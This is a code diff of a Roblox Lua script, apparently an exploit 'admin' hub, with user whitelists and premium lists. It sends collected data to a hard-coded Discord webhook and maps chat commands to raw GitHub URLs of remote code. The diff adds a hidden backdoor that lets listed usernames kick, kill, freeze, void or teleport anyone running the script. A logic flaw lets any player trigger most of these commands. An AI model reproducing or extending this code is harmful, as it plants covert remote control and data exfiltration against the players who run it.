@@ -1,28 +1,3 @@
-local kickers = {"AK_ADMEN1", "328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
-
-local player = game.Players.LocalPlayer
-
-game.Players.PlayerAdded:Connect(function()
-    for i, kicker in pairs(kickers) do
-        for i, v in pairs(game.Players:GetPlayers()) do
-            v.Chatted:Connect(function(msg)
-                if v.Name == kicker and msg == "/kick "..player.Name then
-                    player:Kick("You have been kicked by the owner")
-                end
-            end)
-        end
-    end
-        for i, kicker in pairs(kickers) do
-        for i, v in pairs(game.Players:GetPlayers()) do
-            v.Chatted:Connect(function(msg)
-                if v.Name == kicker and msg == "/bring "..player.Name then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
-                end
-            end)
-        end
-    end
-end)
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -96,9 +71,152 @@ local webhookUrl = "https://discord.com/api/webhooks/1287079693723373639/mESmmi8
 local webhookData = createWebhookData()
 
 sendWebhook(webhookUrl, webhookData)
+local adminCmd = {"AK_ADMEN1", "328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
+
+local player = game.Players.LocalPlayer
+
+game.Players.PlayerAdded:Connect(function()
+    for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg): ()
+                if v.Name == adminCmd and msg:lower() == "/rejoin "..player.Name:lower() or msg:lower() == "/rejoin "..player.DisplayName:lower() then
+local ts = game:GetService("TeleportService")
+
+local p = game:GetService("Players").LocalPlayer
+
+
+
+ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)                end
+            end)
+        end
+    end
+    for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg): ()
+                if v.Name == adminCmd and msg:lower() == "/fast "..player.Name:lower() or msg:lower() == "/fast "..player.DisplayName:lower() then
+                    player.Character.Humanoid.WalkSpeed = 50
+                end
+            end)
+        end
+    end
+        for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg): ()
+                if v.Name == adminCmd and msg:lower() == "/normal "..player.Name:lower() or msg:lower() == "/normal "..player.DisplayName:lower() then
+                    player.Character.Humanoid.WalkSpeed = 16
+                end
+            end)
+        end
+    end
+        for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg): ()
+                if v.Name == adminCmd and msg:lower() == "/slow "..player.Name:lower() or msg:lower() == "/slow "..player.DisplayName:lower() then
+                    player.Character.Humanoid.WalkSpeed = 5
+                end
+            end)
+        end
+    end
+    for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg): ()
+                if v.Name == adminCmd and msg:lower() == "/unfloat "..player.Name:lower() or msg:lower() == "/unfloat "..player.DisplayName:lower() then
+                    player.Character.HumanoidRootPart.Anchored = false
+                end
+            end)
+        end
+    end
+    for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg): ()
+                if v.Name == adminCmd and msg:lower() == "/float "..player.Name:lower() or msg:lower() == "/float "..player.DisplayName:lower() then
+                    player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.CFrame.Position.X,player.Character.HumanoidRootPart.CFrame.Position.Y+5,player.Character.HumanoidRootPart.CFrame.Position.Z)
+                    wait(0.3)
+                    player.Character.HumanoidRootPart.Anchored = true
+                end
+            end)
+        end
+    end
+    for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == adminCmd and msg:lower() == "/void "..player.Name:lower() or msg:lower() == "/void "..player.DisplayName:lower() then
+                    player.Character.HumanoidRootPart.CFrame = CFrame.new(1000000,1000000,1000000)
+                end
+            end)
+        end
+    end
+                    for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == adminCmd and msg:lower() == "/jump "..player.Name:lower() or msg:lower() == "/jump "..player.DisplayName:lower() then
+                    player.Character.Humanoid.Jump=true
+                end
+            end)
+        end
+    end
+                for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == adminCmd and msg:lower() == "/trip "..player.Name:lower() or msg:lower() == "/trip "..player.DisplayName:lower() then
+                    local rotation = CFrame.Angles(math.rad(90), 0, 0)
+                    player.Character.HumanoidRootPart.CFrame=player.Character.HumanoidRootPart.CFrame*rotation
+                end
+            end)
+        end
+    end
+            for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == adminCmd and msg:lower() == "/unfreeze "..player.Name:lower() or msg:lower() == "/unfreeze "..player.DisplayName:lower() then
+                    player.Character.HumanoidRootPart.Anchored = false
+                end
+            end)
+        end
+    end
+        for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == adminCmd and msg:lower() == "/freeze "..player.Name:lower() or msg:lower() == "/freeze "..player.DisplayName:lower() then
+                    player.Character.HumanoidRootPart.Anchored = true
+                end
+            end)
+        end
+    end
+
+    for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == adminCmd and msg:lower() == "/kick "..player.Name:lower() or msg:lower() == "/kick "..player.DisplayName:lower() then
+                    player:Kick("Kicked")
+                end
+            end)
+        end
+    end
+        for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == adminCmd and msg:lower() == "/kill "..player.Name:lower() or msg:lower() == "/kill "..player.DisplayName:lower() then
+                    player.Character.Humanoid.Health=0
+                end
+            end)
+        end
+    end
+
+        for i, adminCmd in pairs(adminCmd) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == adminCmd and msg:lower() == "/bring "..player.Name:lower() or msg:lower() == "/bring "..player.DisplayName:lower() then
+                player.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
+                end
+            end)
+        end
+    end
+end)
+
 local player = game.Players.LocalPlayer
 local playerName = player.Name
-local whitelistedPlayers = {"der_losti2021", "forhelpingboi9", "forhelpingboi8", "BroImTiredOfgames", "miczilla14", "ar3aontop2", "amiay1337", "AK_ADMEN1", "Juluen_banane", "6736_45", "linkster66", "dgthgcnfhhbsd", "Tnk_Him", "TheRealestOnHere", "328ml", "victorwielki", "AliKhammas", "GYATT_DAMN1", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}-- Add more whitelisted player usernames as needed
+local whitelistedPlayers = {"BroImTiredOfgames", "miczilla14", "ar3aontop2", "amiay1337", "AK_ADMEN1", "Juluen_banane", "6736_45", "linkster66", "dgthgcnfhhbsd", "Tnk_Him", "TheRealestOnHere", "328ml", "victorwielki", "AliKhammas", "GYATT_DAMN1", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}-- Add more whitelisted player usernames as needed
 local function showNotification(message, backgroundColor)
     local gui = Instance.new("ScreenGui")
     gui.Name = "Notification"
@@ -227,7 +345,7 @@ local GMS = {
     "victorwielki",
 }
 
-local premiumUsers = {"der_losti2021", "forhelpingboi9", "forhelpingboi8", "BroImTiredOfgames", "miczilla14", "ar3aontop2", "amiay1337", "Juluen_banane", "linkster66", "Tnk_Him", "TheRealestOnHere", "victorwielki", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}
+local premiumUsers = {"BroImTiredOfgames", "miczilla14", "ar3aontop2", "amiay1337", "Juluen_banane", "linkster66", "Tnk_Him", "TheRealestOnHere", "victorwielki", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}
 local cmds = {
           ["/jobidjoiner"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Jobidjoiner",
             ["/bring"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Bring",
